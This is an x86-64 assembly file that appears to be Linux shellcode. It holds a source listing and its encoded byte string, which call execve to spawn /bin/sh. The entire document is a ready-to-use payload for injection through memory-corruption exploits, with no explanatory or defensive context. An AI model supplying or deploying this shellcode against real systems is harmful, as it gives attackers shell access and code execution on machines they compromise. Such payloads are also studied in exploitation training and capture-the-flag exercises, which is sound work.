global _start
section .text
 
_start:
	; execve("/bin/sh", ["/bin/sh"], NULL)
	;"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

	xor		rdx, rdx
	mov		qword rbx, '//bin/sh'		; 0x68732f6e69622f2f
	shr		rbx, 0x8
	push		rbx
	mov		rdi, rsp
	push		rax
	push		rdi
	mov		rsi, rsp
	mov		al, 0x3b
	syscall
